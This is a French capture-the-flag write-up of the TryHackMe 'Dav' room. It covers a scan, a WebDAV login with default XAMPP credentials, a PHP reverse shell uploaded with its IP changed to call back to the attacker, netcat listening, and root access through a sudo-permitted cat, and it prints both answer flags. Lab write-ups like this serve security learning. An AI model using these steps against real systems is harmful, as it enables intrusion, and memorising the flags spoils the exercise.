# Dav #

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.220.213 dav.thm' >> /etc/hosts"
```

On met un nom de domaine à notre ip pour simplifier les démarches.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A dav.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 14:10 CEST
Nmap scan report for dav.thm (10.10.220.213)
Host is up (0.044s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/18%OT=80%CT=1%CU=33834%PV=Y%DS=2%DC=T%G=Y%TM=60F41A3
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   33.71 ms 10.9.0.1
2   34.09 ms dav.thm (10.10.220.213)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.13 seconds
```

On remarque ici plusieurs chose :  
-Le service http sur le port 80 est disponible.  
-Que la page principale est la page par défaut d'apache.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://dav.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dav.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/18 14:17:23 Starting gobuster in directory enumeration mode
===============================================================
/webdav               (Status: 401) [Size: 454]
/server-status        (Status: 403) [Size: 295]
                                               
===============================================================
2021/07/18 14:31:33 Finished
===============================================================
```

On repère un lien, regardons-le.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ w3m http://dav.thm/webdav/
Password for webdav: 
```

Pour le nouveau lien on nous demande des identifiants, ont ne les a pas.
En faisant une recherche sur internet on trouve les identifiants.
Non d'utilisateur : wampp
Mot de passe      : xampp

```bash
Authentication required for webdav on server `dav.thm':
Username: wampp
Password: 
dav:/webdav/> 
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  août 26  2019
dav:/webdav/> get passwd.dav
Downloading `/webdav/passwd.dav' to passwd.dav:
Progress: [=============================>] 100,0% of 44 bytes succeeded.
dav:/webdav/> exit
Connection to `dav.thm' closed.
tim@kali:~/Bureau/tryhackme/write-up$ cat passwd.dav 
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

Avec cadaver on récupère un fichier.  
Dans le fichier il y un hash.  
J'arrive pas à casser le hash avec john ou hashcat.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2021-07-18 15:39:43--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Résolution de raw.githubusercontent.com (raw.githubusercontent.com)… 185.199.110.133, 185.199.109.133, 185.199.111.133, ...
Connexion à raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 5491 (5,4K) [text/plain]
Sauvegarde en : « php-reverse-shell.php »

php-reverse-shell.php                                       100%[=========================================================================================================================================>]   5,36K  --.-KB/s    ds 0s      

2021-07-18 15:39:43 (23,6 MB/s) — « php-reverse-shell.php » sauvegardé [5491/5491]
tim@kali:~/Bureau/tryhackme/write-up$ sed -i "s/127.0.0.1/10.9.228.66/g" php-reverse-shell.php 
tim@kali:~/Bureau/tryhackme/write-up$ cadaver http://dav.thm/webdav/
Authentication required for webdav on server `dav.thm':
Username: wampp
Password: 
dav:/webdav/> put php-reverse-shell.php
Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100,0% of 5493 bytes succeeded.
```

On télécharge un reverse-shell en php.  
On modifie l'ip par la notre.  
On se connect avec cadaver pour transferer le reverse-shell.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
```

On écoute le sur le port 1234. 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ w3n http://dav.thm/webdav/php-reverse-shell.php
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
$ whoami
www-data
$ ls /home/
merlin
wampp
$ cat /home/merlin/user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

A partir du shell, dans le répertoire on trouve deux utilisateurs wampp et merlin. 
Quand on regarde le fichier user.txt dans merlin on a notre flag.  

La réponse est : 449b40fe93f78a938523b7e4dcd66d2a 

```bash
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

$ sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```

En regardant dans la configuration sudo, on remarque que /bin/cat peut être exécuter sans mot de passe.  
Avec cat, on afficher le contenu du fichier root.txt.   

La réponse est : 101101ddc16b0cdf65ba0b8a7af7afa5  